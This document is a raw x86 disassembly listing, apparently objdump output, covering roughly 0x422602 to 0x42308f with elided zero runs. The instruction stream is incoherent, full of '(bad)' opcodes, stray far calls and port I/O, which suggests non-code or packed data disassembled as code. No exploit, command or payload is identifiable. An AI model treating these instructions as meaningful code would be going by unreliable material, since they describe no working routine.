  422602:	repz das 
  422604:	fisubr WORD PTR [esi+0x1]
  422607:	add    BYTE PTR ds:0xf4000001,al
  42260d:	adc    eax,ebp
  42260f:	add    eax,edi
  422611:	call   0xe7abea44
  422616:	xchg   dh,al
  422618:	and    eax,DWORD PTR [edi+edx*2]
  42261b:	loop   0x422698
  42261d:	jecxz  0x42260d
  42261f:	xchg   edx,eax
  422620:	addr16 adc eax,0xb9d6ecc6
  422626:	xchg   edx,eax
  422627:	data16 jns 0x4225d1
  42262a:	mov    bh,0xb8
  42262c:	add    ecx,DWORD PTR [eax]
  42262e:	adc    DWORD PTR [esi-0x6fcae719],esp
  422634:	addr16 adc al,cl
  422637:	ffree  st(0)
  422639:	imul   esi,DWORD PTR [ecx-0x6ec999f7],0x6f
  422640:	gs daa 
  422642:	test   DWORD PTR [edi+ebx*2],ecx
  422645:	cmp    bl,ah
  422647:	cwde   
  422648:	jb     0x422654
  42264a:	je     0x4225d9
  42264c:	jns    0x42265b
  42264e:	add    al,0xba
  422650:	sub    BYTE PTR ds:0xca01ba3e,al
  422656:	mov    al,ds:0xaf127ed5
  42265b:	cmp    edx,DWORD PTR [ebp+ebp*2+0x4b]
  42265f:	mov    dh,0x1f
  422661:	sbb    edx,DWORD PTR [edx-0x5642541f]
  422667:	jnp    0x4226af
  422669:	push   edi
  42266a:	stc    
  42266b:	ins    DWORD PTR es:[edi],dx
  42266c:	adc    BYTE PTR [eax+0x2d6348fc],al
  422672:	sbb    DWORD PTR [esp+ecx*8],0xffffffd7
  422676:	mov    cs,eax
  422678:	cmp    DWORD PTR [eax-0x534867bf],ebx
  42267e:	jo     0x42262f
  422680:	(bad)  
  422681:	xchg   ebx,eax
  422682:	and    BYTE PTR [esi+0x5acd0ee8],dh
  422688:	cmp    DWORD PTR [ecx],ebp
  42268a:	imul   esp,DWORD PTR [esp+esi*1-0x4],0x69
  42268f:	adc    DWORD PTR [esp+eax*4+0x3c],ebp
  422693:	pop    ss
  422694:	pop    ebp
  422695:	jns    0x42267f
  422697:	rol    DWORD PTR [ecx+0x6a5866e5],0x6b
  42269e:	xchg   edx,eax
  42269f:	push   ds
  4226a0:	shl    esi,1
  4226a2:	sbb    al,0x5c
  4226a4:	ds pop ss
  4226a6:	mov    eax,ds:0x9e26748b
  4226ab:	mov    bl,0x6
  4226ad:	jecxz  0x422688
  4226af:	sbb    eax,0x61be3d55
  4226b4:	icebp  
  4226b5:	nop
  4226b6:	inc    esp
  4226b7:	pop    eax
  4226b8:	xor    DWORD PTR [ebp+ebx*2-0x1b],edx
  4226bc:	mov    BYTE PTR [ebp+0x1218dd59],ch
  4226c2:	lea    edi,[ecx+edi*4-0x43]
  4226c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226c7:	xchg   edx,eax
  4226c8:	mov    esp,0x6245c757
  4226cd:	je     0x4226fc
  4226cf:	add    BYTE PTR [edi-0x27],0x55
  4226d3:	test   DWORD PTR cs:[edi+0x56f47b8a],edi
  4226da:	xlat   BYTE PTR ds:[ebx]
  4226db:	fdivr  DWORD PTR [esi-0x28]
  4226de:	xchg   BYTE PTR [ebp+0x57e33414],cl
  4226e4:	or     DWORD PTR [esi+edi*8-0x10],edi
  4226e8:	cmp    ecx,DWORD PTR [edx-0x49]
  4226eb:	call   0xe339aa41
  4226f0:	dec    ecx
  4226f1:	adc    eax,0xbff0a227
  4226f6:	xor    eax,DWORD PTR [ebx]
  4226f8:	rol    dh,0x3f
  4226fb:	inc    ebp
  4226fc:	jmp    0x757ba928
  422701:	push   ecx
  422702:	cld    
  422703:	ja     0x42270d
  422705:	xchg   BYTE PTR [edx-0x5cc48f3c],ch
  42270b:	es scas al,BYTE PTR es:[edi]
  42270d:	push   ebp
  42270e:	xchg   esp,eax
  42270f:	arpl   dx,si
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xdf7f01c8
  422781:	mov    dl,dl
  422783:	popf   
  422784:	jecxz  0x4227f5
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0x2e000001
  42278d:	jnp    0x4227f4
  42278f:	fwait
  422790:	and    eax,0xcd185d41
  422795:	mov    edi,0x6afed920
  42279a:	sub    ah,ch
  42279c:	outs   dx,BYTE PTR ds:[esi]
  42279d:	adc    eax,0xb8e47829
  4227a2:	int    0x17
  4227a4:	(bad)  
  4227a5:	loop   0x42280b
  4227a7:	(bad)  
  4227a8:	mov    edx,0xcd333304
  4227ad:	clc    
  4227ae:	add    ebx,DWORD PTR [edi-0x78]
  4227b1:	cs pop esp
  4227b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b4:	jg     0x42281d
  4227b6:	lock jne 0x4227ea
  4227b9:	xor    al,0x84
  4227bb:	imul   ebx,DWORD PTR [ecx-0x6d],0x15dca719
  4227c2:	pop    edx
  4227c3:	call   0x5ccf:0xef76c5c2
  4227ca:	jle    0x422785
  4227cc:	retf   0xa65f
  4227cf:	test   edi,ecx
  4227d1:	pop    es
  4227d2:	jge    0x422804
  4227d4:	dec    DWORD PTR [ebx+0x4cb8202b]
  4227da:	or     edx,DWORD PTR [esi-0x22]
  4227dd:	loope  0x42283f
  4227df:	mov    dh,0xd7
  4227e1:	or     bh,bh
  4227e3:	xchg   ebp,eax
  4227e4:	mul    DWORD PTR [esi-0x3bdb53e0]
  4227ea:	inc    eax
  4227eb:	popa   
  4227ec:	xchg   esp,eax
  4227ed:	js     0x4227f2
  4227ef:	add    eax,0x161080da
  4227f4:	es pop edi
  4227f6:	jmp    0x11efa06a
  4227fb:	pop    ebx
  4227fc:	das    
  4227fd:	adc    al,0xb0
  4227ff:	jecxz  0x42280a
  422801:	iret   
  422802:	push   esi
  422803:	sbb    BYTE PTR [ebx],bh
  422805:	data16 jno 0x4227e5
  422808:	or     bh,BYTE PTR [ebx]
  42280a:	sub    ebx,ecx
  42280c:	dec    edi
  42280d:	in     eax,dx
  42280e:	imul   eax,DWORD PTR [edx],0x61425867
  422814:	dec    ebx
  422815:	das    
  422816:	test   BYTE PTR ds:0x8682f875,dh
  42281c:	rcr    DWORD PTR [ecx],1
  42281e:	push   0xffffff98
  422820:	sub    BYTE PTR [edi],0x90
  422823:	sbb    eax,0x17f91296
  422828:	and    ch,BYTE PTR [ebx+0x46]
  42282b:	push   ebp
  42282c:	sub    eax,0x6d05ad11
  422831:	ins    DWORD PTR es:[edi],dx
  422832:	pop    ss
  422833:	push   cs
  422834:	add    DWORD PTR [esi-0xdab3246],esi
  42283a:	jle    0x422828
  42283c:	cmp    ecx,esp
  42283e:	jns    0x4227e9
  422840:	loopne 0x4227f1
  422842:	push   ds
  422843:	ins    BYTE PTR es:[edi],dx
  422844:	fmul   QWORD PTR [ebx+0x42]
  422847:	push   ebp
  422848:	es test bl,bh
  42284b:	cmp    al,0xc1
  42284d:	push   ss
  42284e:	stc    
  42284f:	in     al,0xda
  422851:	call   0x239568a5
  422856:	lock cmc 
  422858:	and    cl,BYTE PTR [edx-0x28]
  42285b:	add    eax,0xe2aa7a9c
  422860:	(bad)  
  422862:	xchg   ecx,eax
  422863:	lds    edx,FWORD PTR [edx+0x10]
  422866:	push   ecx
  422867:	pushf  
  422868:	outs   dx,DWORD PTR ds:[esi]
  422869:	imul   esp,DWORD PTR [esi-0x27],0xfffffff0
  42286d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286e:	scas   al,BYTE PTR es:[edi]
  42286f:	neg    ah
  422871:	scas   al,BYTE PTR es:[edi]
  422872:	icebp  
  422873:	mov    dh,dh
  422875:	(bad)  
  422876:	dec    ebx
  422877:	or     al,0x27
  422879:	lahf   
  42287a:	fs adc cl,al
  42287d:	je     0x42282d
  42287f:	in     eax,dx
  422880:	cli    
  422881:	sar    DWORD PTR [ecx],cl
  422883:	add    al,0xfb
  422885:	out    dx,al
  422886:	or     cl,BYTE PTR [ecx+0x44]
  422889:	les    ebp,FWORD PTR [ecx-0x636e3850]
  42288f:	and    al,0xb4
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422973
  422901:	push   edi
  422902:	dec    ebp
  422903:	call   0x105:0x170e8
  42290a:	add    BYTE PTR [eax],al
  42290c:	jmp    0x9cbd0f41
  422911:	enter  0x28dd,0xfd
  422915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422916:	jo     0x4228df
  422918:	jge    0x422936
  42291a:	push   ebx
  42291b:	out    dx,al
  42291c:	popf   
  42291d:	sbb    BYTE PTR [edi-0x61a1672a],al
  422923:	cmp    ebx,esi
  422925:	jg     0x42294c
  422927:	jp     0x4228f3
  422929:	add    edx,edi
  42292b:	or     DWORD PTR ds:0x4be87f18,esi
  422931:	data16 scas al,BYTE PTR es:[edi]
  422933:	mov    cl,0x98
  422935:	inc    ecx
  422936:	test   al,0xd4
  422938:	sbb    al,0x38
  42293a:	sbb    edi,DWORD PTR [edx-0x26]
  42293d:	xchg   BYTE PTR [ebp-0x4939df98],al
  422943:	dec    ebx
  422944:	adc    eax,0xc33dd572
  422949:	adc    ebx,DWORD PTR ds:0x238bcc41
  42294f:	bound  edx,QWORD PTR [ecx+0x2c5f6e83]
  422955:	mov    bl,0xf0
  422957:	fldcw  WORD PTR [esi+0x62d3d813]
  42295d:	inc    edx
  42295e:	push   esp
  42295f:	sar    DWORD PTR [edi],cl
  422961:	pushf  
  422962:	out    dx,eax
  422963:	shr    ah,0xc
  422966:	jecxz  0x4229b1
  422968:	test   eax,0xdf6bbcc4
  42296d:	(bad)  
  42296e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42296f:	fisttp DWORD PTR [ebx]
  422971:	mov    DWORD PTR [edi+0x65],esp
  422974:	shl    DWORD PTR [ebx],0x54
  422977:	add    ch,BYTE PTR [ebp-0x5bcfe69c]
  42297d:	repz jns 0x4229ea
  422980:	sbb    eax,0xfd6f9cd5
  422985:	js     0x42296e
  422987:	pop    edi
  422988:	fstp   QWORD PTR [eax-0x19]
  42298b:	push   ds
  42298c:	xchg   ebx,eax
  42298d:	fnclex 
  42298f:	mov    ?,WORD PTR [ebp-0x56dff93c]
  422995:	es test edi,0xf893eda
  42299c:	clc    
  42299d:	(bad)  
  42299e:	and    BYTE PTR [esi-0x74],dh
  4229a1:	(bad)  
  4229a2:	fdiv   QWORD PTR [edx-0x48539887]
  4229a8:	stos   BYTE PTR es:[edi],al
  4229a9:	outs   dx,BYTE PTR ds:[esi]
  4229aa:	mov    ah,0x45
  4229ac:	adc    dl,cl
  4229ae:	std    
  4229af:	mov    ah,0xf7
  4229b1:	test   al,0x74
  4229b3:	aad    0x32
  4229b5:	ja     0x422a2e
  4229b7:	daa    
  4229b8:	out    dx,al
  4229b9:	test   al,0xbb
  4229bb:	adc    BYTE PTR [eax+0x4f],ch
  4229be:	xlat   BYTE PTR ds:[ebx]
  4229bf:	popa   
  4229c0:	mov    dl,0xa
  4229c2:	inc    edi
  4229c3:	ja     0x422a33
  4229c5:	jl     0x4229ef
  4229c7:	popa   
  4229c8:	out    dx,eax
  4229c9:	int3   
  4229ca:	pushf  
  4229cb:	push   0x5a
  4229cd:	or     esi,esi
  4229cf:	pop    eax
  4229d1:	out    dx,al
  4229d2:	add    dh,BYTE PTR [eax+0x2431ed4a]
  4229d8:	test   DWORD PTR [edx+edi*4+0xd],eax
  4229dc:	mov    bh,0x70
  4229de:	loope  0x422962
  4229e0:	fisub  WORD PTR [ecx-0x7d77058f]
  4229e6:	mov    ch,0xd6
  4229e8:	xchg   ecx,eax
  4229e9:	sub    esp,DWORD PTR [edi+eax*1+0x48be0400]
  4229f0:	jmp    0x422a35
  4229f2:	sub    BYTE PTR [ecx+0x53],bl
  4229f5:	push   es
  4229f6:	aam    0x11
  4229f8:	push   edi
  4229f9:	lock call 0x4e00:0x52913408
  422a01:	shr    BYTE PTR [esp+edx*1+0xb13fc0],cl
  422a08:	sub    dh,bl
  422a0a:	imul   esp,DWORD PTR [eax+0x538140bf],0xffffff85
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	cmp    DWORD PTR [esi-0x33],ebp
  422a83:	lahf   
  422a84:	in     eax,dx
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0xa6000001,al
  422a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a8e:	sbb    al,0x1c
  422a90:	fwait
  422a91:	dec    ebx
  422a92:	and    edi,DWORD PTR [ecx-0x2c]
  422a95:	(bad)  [ebx+0x4ca192da]
  422a9b:	fcmovu st,st(2)
  422a9d:	or     al,0xe3
  422a9f:	sar    ebp,1
  422aa1:	imul   ebx,DWORD PTR [edx-0x2c173c0],0xfb47e772
  422aab:	ret    
  422aac:	mov    eax,0x724794d4
  422ab1:	fmul   st(2),st
  422ab3:	in     eax,dx
  422ab4:	outs   dx,DWORD PTR ds:[esi]
  422ab5:	pop    ss
  422ab6:	or     esi,DWORD PTR ds:0xf80a21da
  422abc:	sub    esi,DWORD PTR [ebx+0x6c]
  422abf:	pop    ecx
  422ac0:	dec    eax
  422ac1:	mov    ecx,0x6c3941d9
  422ac6:	add    eax,DWORD PTR [esi+0xe]
  422ac9:	cmp    cl,BYTE PTR [eax]
  422acb:	and    edx,DWORD PTR [edi+eax*1]
  422ace:	test   al,0x72
  422ad0:	and    eax,0xb18b1bfa
  422ad5:	dec    edx
  422ad6:	add    BYTE PTR [eax-0x6779455d],bh
  422adc:	ror    BYTE PTR [eax+0x722078b7],1
  422ae2:	in     al,dx
  422ae3:	shl    BYTE PTR [ebp+0x7f],cl
  422ae6:	sub    eax,esp
  422ae8:	test   DWORD PTR [ebx+0x577a76b0],ebx
  422aee:	mov    bh,0x18
  422af0:	dec    edi
  422af1:	mov    WORD PTR [edi+0x727c9fef],cs
  422af7:	test   eax,0xf667180e
  422afc:	loop   0x422acd
  422afe:	lock pop esi
  422b00:	retf   0xfeec
  422b03:	js     0x422b78
  422b05:	sbb    dh,BYTE PTR [edi+0x4e2f3dc5]
  422b0b:	les    eax,FWORD PTR gs:[edi+0x150eedda]
  422b12:	jmp    0x422b7f
  422b14:	push   ss
  422b15:	dec    ecx
  422b16:	jo     0x422ac5
  422b18:	test   DWORD PTR [esi+0x33],esp
  422b1b:	lods   al,BYTE PTR ds:[esi]
  422b1d:	jne    0x422ab3
  422b1f:	push   ebp
  422b20:	les    ecx,FWORD PTR [eax+0x3ac284d5]
  422b26:	sar    esp,cl
  422b28:	ret    0x9e91
  422b2b:	dec    edx
  422b2c:	pop    ss
  422b2d:	gs imul ebp,eax,0x57c00fbf
  422b34:	test   DWORD PTR [esp+edi*2],edi
  422b37:	sub    ecx,esi
  422b39:	adc    bh,BYTE PTR [esi]
  422b3b:	ja     0x422b69
  422b3d:	sbb    ch,BYTE PTR [ebp-0x45]
  422b40:	xor    eax,0x6947d353
  422b45:	jae    0x422ba8
  422b47:	rcl    BYTE PTR [edi+eax*1+0x40],0x44
  422b4c:	jge    0x422ad4
  422b4e:	int3   
  422b4f:	jmp    0x5a77:0x1c6ec392
  422b56:	sar    esi,cl
  422b58:	mov    al,ds:0xd7a211bf
  422b5d:	sbb    BYTE PTR ds:0x2c718cac,0xb4
  422b64:	ins    DWORD PTR es:[edi],dx
  422b65:	call   0x598a:0xed957529
  422b6c:	outs   dx,DWORD PTR ds:[esi]
  422b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b6e:	out    dx,eax
  422b6f:	pop    esi
  422b70:	add    DWORD PTR [edi],ebp
  422b72:	cmp    al,0x6a
  422b74:	xlat   BYTE PTR ds:[ebx]
  422b75:	jo     0x422b3d
  422b77:	push   0xcfe741d9
  422b7c:	jae    0x422bf4
  422b7e:	outs   dx,BYTE PTR ds:[esi]
  422b7f:	dec    edi
  422b80:	sub    esi,DWORD PTR [ebp+0x514d1fa9]
  422b86:	std    
  422b87:	jecxz  0x422bd4
  422b89:	jge    0x422b8f
  422b8b:	jp     0x422b93
  422b8d:	push   ecx
  422b8e:	xlat   BYTE PTR ds:[ebx]
  422b8f:	aas    
  422b90:	sbb    al,BYTE PTR [eax]
	...
  422bf2:	add    BYTE PTR [eax],al
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x1440b264]
  422c02:	lahf   
  422c03:	mov    ds:0x172f2,al
  422c08:	add    eax,0x59000001
  422c0d:	lds    esp,FWORD PTR [edx+0x874d36f]
  422c13:	jbe    0x422c3d
  422c15:	xor    al,0x7d
  422c17:	push   ebx
  422c18:	xchg   ebp,eax
  422c19:	arpl   WORD PTR [esp+ecx*1],bx
  422c1c:	(bad)  
  422c1d:	fs mov eax,0x6bf428a2
  422c23:	hlt    
  422c24:	pop    esp
  422c25:	ret    
  422c26:	adc    edi,DWORD PTR [eax+0x2a124d3a]
  422c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c2d:	mov    BYTE PTR [ebp-0x4cdde0ee],dl
  422c33:	dec    ecx
  422c34:	jo     0x422c90
  422c36:	push   edx
  422c37:	inc    esp
  422c38:	daa    
  422c39:	pushf  
  422c3a:	shr    BYTE PTR [esi+0x71],1
  422c3d:	js     0x422bfe
  422c3f:	or     DWORD PTR [ecx+0x78],ebp
  422c42:	fs inc edx
  422c44:	rcl    ch,1
  422c46:	inc    ebx
  422c47:	add    al,0x2
  422c49:	in     eax,dx
  422c4a:	pusha  
  422c4b:	mov    ah,0x94
  422c4d:	(bad)  
  422c4e:	sub    esi,esi
  422c50:	xor    al,0x37
  422c52:	push   ss
  422c53:	jno    0x422ccb
  422c55:	enter  0xef9f,0x22
  422c59:	cmp    bl,BYTE PTR [esi]
  422c5b:	scas   al,BYTE PTR es:[edi]
  422c5c:	scas   eax,DWORD PTR es:[edi]
  422c5d:	inc    edx
  422c5e:	loopne 0x422c94
  422c60:	popf   
  422c61:	add    esp,DWORD PTR [eax-0x21f17c15]
  422c67:	push   cs
  422c68:	stos   DWORD PTR es:[edi],eax
  422c69:	rol    bl,0x9b
  422c6c:	(bad)  
  422c6d:	icebp  
  422c6e:	dec    ebx
  422c6f:	adc    edi,DWORD PTR [edi+0x6e6f6887]
  422c75:	push   ebp
  422c76:	repnz xchg edx,eax
  422c78:	mov    ebx,0x12d0c96a
  422c7d:	cmp    esi,DWORD PTR [ebx+0x511281e1]
  422c83:	jbe    0x422c38
  422c85:	fstp   TBYTE PTR [eax+eiz*8]
  422c88:	add    al,dh
  422c8a:	loope  0x422c10
  422c8c:	out    0xc7,eax
  422c8e:	mov    ebp,0x26ccf195
  422c93:	shr    BYTE PTR [ebx-0x7ce5fabf],1
  422c99:	in     al,0xf
  422c9b:	out    dx,al
  422c9c:	aam    0x83
  422c9e:	test   DWORD PTR [eax+ebx*2+0x2b],edx
  422ca2:	inc    edi
  422ca3:	sub    dl,al
  422ca5:	(bad)  
  422ca6:	mov    BYTE PTR [eax-0x5a],dh
  422ca9:	popf   
  422caa:	aas    
  422cab:	cmp    esi,eax
  422cad:	xlat   BYTE PTR ds:[ebx]
  422cae:	add    edi,DWORD PTR ds:0x205183c4
  422cb4:	jmp    0x974c:0xa17a85d8
  422cbb:	jge    0x422ced
  422cbd:	adc    BYTE PTR [edx+0x4d],bh
  422cc0:	outs   dx,DWORD PTR ds:[esi]
  422cc1:	daa    
  422cc2:	ja     0x422cc9
  422cc4:	sbb    eax,0xabe4225b
  422cc9:	sub    al,0x2c
  422ccb:	xchg   edx,eax
  422ccc:	(bad)  
  422ccd:	jns    0x422c5d
  422ccf:	mov    ecx,0xb5075f7d
  422cd4:	int    0x97
  422cd6:	dec    edi
  422cd7:	test   al,0x10
  422cd9:	cli    
  422cda:	or     DWORD PTR [ebx-0x15a11386],ebp
  422ce0:	push   es
  422ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce2:	in     eax,dx
  422ce3:	fistp  WORD PTR [esi-0x52]
  422ce6:	ins    BYTE PTR es:[edi],dx
  422ce7:	add    DWORD PTR [ecx-0x4e],esp
  422cea:	arpl   WORD PTR ds:[esi],dx
  422ced:	jmp    0x422cb2
  422cef:	or     ah,cl
  422cf1:	xlat   BYTE PTR ds:[ebx]
  422cf2:	sar    BYTE PTR ds:0xfc6202aa,0xf6
  422cf9:	hlt    
  422cfa:	mov    esi,0x84d4a32a
  422cff:	lds    ecx,FWORD PTR [ebx+0xe]
  422d02:	inc    esi
  422d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d04:	cmp    DWORD PTR [esi+0x3254364f],eax
  422d0a:	jae    0x422cb5
  422d0c:	and    esi,DWORD PTR [eax+0x53]
  422d0f:	pop    esi
  422d10:	ret    
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esi,DWORD PTR [ebx+eiz*1+0x73f78652]
  422d86:	add    DWORD PTR [eax],eax
  422d88:	add    eax,0xad000001
  422d8d:	(bad)  
  422d8e:	out    dx,al
  422d8f:	sub    dl,bh
  422d91:	sub    al,0x1c
  422d93:	xchg   esp,eax
  422d94:	pop    ebx
  422d95:	aas    
  422d96:	sub    al,dh
  422d98:	adc    DWORD PTR [ebp+0x7c],esi
  422d9b:	adc    DWORD PTR [ebp+ebp*8+0x2ac7aefa],edi
  422da2:	pop    edx
  422da3:	pop    es
  422da4:	push   edi
  422da5:	data16 cld 
  422da7:	aam    0x31
  422da9:	pop    ebx
  422daa:	and    esp,DWORD PTR [edi+esi*2+0x1c]
  422dae:	add    esi,esi
  422db0:	lock mov ebp,0x74439a9c
  422db6:	sbb    cl,ch
  422db8:	pushf  
  422db9:	inc    ebx
  422dba:	shl    ebx,cl
  422dbc:	and    ebp,DWORD PTR [eax-0x3560d9ec]
  422dc2:	not    DWORD PTR [ebx]
  422dc4:	mov    ah,0xcb
  422dc6:	adc    BYTE PTR [ecx-0x5b9c18d],cl
  422dcc:	icebp  
  422dcd:	test   BYTE PTR [eax],bh
  422dcf:	in     al,0x88
  422dd1:	stc    
  422dd2:	inc    ebp
  422dd3:	sub    al,0xc5
  422dd5:	push   ebx
  422dd6:	sub    eax,0xffbeebec
  422ddb:	lods   al,BYTE PTR ds:[esi]
  422ddc:	cmp    esi,edi
  422dde:	mov    al,0xf7
  422de0:	jae    0x422d71
  422de2:	dec    ebp
  422de3:	mov    ds:0x8b424a0f,al
  422de8:	fxtract 
  422dea:	adc    eax,0x7fa1c0fe
  422def:	pop    edx
  422df0:	out    0x99,eax
  422df2:	retf   
  422df3:	stc    
  422df4:	(bad)  
  422df5:	popa   
  422df6:	cmp    al,0xaf
  422df8:	loope  0x422e5a
  422dfa:	in     eax,dx
  422dfb:	sbb    BYTE PTR [eax-0x74],al
  422dfe:	add    al,0x7e
  422e00:	or     DWORD PTR [edx-0x7c237fed],0x44edae6f
  422e0a:	mov    esp,0x2795f284
  422e0f:	dec    ebx
  422e10:	push   edi
  422e11:	or     ah,BYTE PTR [ebp+eiz*1+0x16f7244a]
  422e18:	in     eax,dx
  422e19:	cmc    
  422e1a:	sub    al,0x19
  422e1c:	pushf  
  422e1d:	push   esi
  422e1e:	adc    edi,DWORD PTR [edi+ecx*2+0x4f7311a]
  422e25:	shr    BYTE PTR [ebx+0x568e1ea0],1
  422e2b:	mov    DWORD PTR [eax],edx
  422e2d:	inc    ebx
  422e2e:	cmp    esp,ecx
  422e30:	adc    dh,ch
  422e32:	adc    DWORD PTR [ecx+0x49],0x60
  422e36:	test   DWORD PTR [edx-0x2a5acd43],esi
  422e3c:	push   ebp
  422e3d:	xchg   edx,edi
  422e3f:	out    0xbc,al
  422e41:	sub    DWORD PTR [edi+0x79],edi
  422e44:	jbe    0x422e37
  422e46:	sti    
  422e47:	shl    BYTE PTR [ebp+0x8b8c655],cl
  422e4d:	test   BYTE PTR [esi],bh
  422e4f:	stc    
  422e50:	jge    0x422ea4
  422e52:	mov    al,0xb8
  422e54:	add    BYTE PTR [eax-0x78],ch
  422e57:	(bad)  [edi-0x1578dd7b]
  422e5d:	xchg   ebp,eax
  422e5e:	jge    0x422edd
  422e60:	ret    0xd130
  422e63:	jo     0x422e6f
  422e65:	lea    ebx,[edi+0x7496ff7d]
  422e6b:	or     dl,dh
  422e6d:	dec    edi
  422e6e:	aaa    
  422e6f:	mov    edi,0xb79d0fa
  422e74:	loope  0x422dfa
  422e76:	cmp    bh,BYTE PTR [ebp-0x35]
  422e79:	call   0x1e76:0x3260b2d8
  422e80:	adc    eax,0x7104d702
  422e85:	mov    eax,0x73c1553d
  422e8a:	out    0x5c,eax
  422e8c:	mov    cs,WORD PTR [edi+0xbcc2cd]
	...
  422ef2:	add    BYTE PTR [eax],al
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x29dcca33
  422f02:	test   dh,0xfc
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x36000001,al
  422f0d:	push   0xb44bc483
  422f12:	stos   BYTE PTR es:[edi],al
  422f13:	sbb    BYTE PTR [esi+esi*1-0x1e],dh
  422f17:	push   ecx
  422f18:	out    dx,al
  422f19:	mov    ecx,0x162df1b7
  422f1e:	mov    ah,0xa4
  422f20:	dec    ebx
  422f21:	cld    
  422f22:	out    0xbb,al
  422f24:	leave  
  422f25:	or     eax,0x7942b692
  422f2a:	inc    esp
  422f2b:	outs   dx,BYTE PTR ds:[esi]
  422f2c:	in     eax,dx
  422f2d:	adc    DWORD PTR [ebp-0x76084243],ecx
  422f33:	cmp    esi,DWORD PTR [edi-0xf]
  422f36:	out    dx,al
  422f37:	repz in al,0xc3
  422f3a:	fldenv [ebx+0x10]
  422f3d:	push   edi
  422f3e:	fild   DWORD PTR [ebx]
  422f40:	clc    
  422f41:	add    ah,BYTE PTR [eax]
  422f43:	push   ebp
  422f44:	cld    
  422f45:	jmp    0x80d10897
  422f4a:	daa    
  422f4b:	std    
  422f4c:	ja     0x8a4267cb
  422f52:	loope  0x422f2a
  422f54:	and    eax,0xdda9d472
  422f59:	call   0xdc57:0x949753c5
  422f60:	lock mov eax,0x8c6e7408
  422f66:	cmc    
  422f67:	in     al,0x13
  422f69:	pop    ecx
  422f6a:	adc    cl,BYTE PTR [edi+0x70d925]
  422f70:	sbb    DWORD PTR [edi],ebp
  422f72:	jnp    0x422f44
  422f74:	into   
  422f75:	ds add edi,ebp
  422f78:	loop   0x422f22
  422f7a:	fnstenv [edi-0x38]
  422f7d:	int3   
  422f7e:	mov    al,ds:0xec72908d
  422f83:	and    dl,BYTE PTR [ebp+0x710a3247]
  422f89:	fcmovnbe st,st(3)
  422f8b:	int3   
  422f8c:	push   ebp
  422f8d:	ins    BYTE PTR es:[edi],dx
  422f8e:	call   0x6d63:0xe6387c85
  422f95:	rcr    BYTE PTR [edx+0xf41f80d],cl
  422f9b:	jge    0x422fc8
  422f9d:	adc    BYTE PTR [esi],0x80
  422fa0:	jb     0x422fb1
  422fa2:	(bad)  {k6}{z}
  422fa7:	mov    WORD PTR [ebp+0x6b5cb11a],ds
  422fad:	xchg   esp,eax
  422fae:	xor    eax,0xb77e9f99
  422fb3:	into   
  422fb4:	mov    dh,0x95
  422fb6:	inc    eax
  422fb7:	pop    ebp
  422fb8:	test   BYTE PTR [ebx+0x5362a5b6],0x78
  422fbf:	int    0x98
  422fc1:	in     eax,0xa
  422fc3:	push   ss
  422fc4:	jp     0x422f94
  422fc6:	dec    eax
  422fc7:	or     al,BYTE PTR ds:0x4a8e0ccb
  422fcd:	mov    eax,ds:0x45e5c9f8
  422fd2:	daa    
  422fd3:	and    BYTE PTR [esp+eax*2-0x1a5aa611],bh
  422fda:	or     al,0x34
  422fdc:	push   ebp
  422fdd:	aas    
  422fde:	out    dx,eax
  422fdf:	ret    0x9ab0
  422fe2:	popf   
  422fe3:	ins    BYTE PTR es:[edi],dx
  422fe4:	retf   0xa3e6
  422fe7:	leave  
  422fe8:	jge    0x423055
  422fea:	imul   ecx,DWORD PTR [esp+edi*4+0x3c],0x16
  422fef:	mov    al,0xe2
  422ff1:	add    esi,edi
  422ff3:	div    DWORD PTR [ecx]
  422ff5:	mov    ecx,0x1338162b
  422ffa:	push   ebx
  422ffb:	push   edi
  422ffc:	push   cs
  422ffd:	shr    DWORD PTR [ecx*8-0x4d5dc670],cl
  423004:	clc    
  423005:	xchg   DWORD PTR [ebp+0x461a0f1a],ebp
  42300b:	jne    0x42304e
  42300d:	pop    ebx
  42300e:	pop    ebx
  42300f:	cmp    al,0x9d
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [esi+eax*4+0x10cbca6],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x61000001,al
  42308d:	pop    ecx
  42308e:	push   ecx
  42308f:	xchg   esi,eax
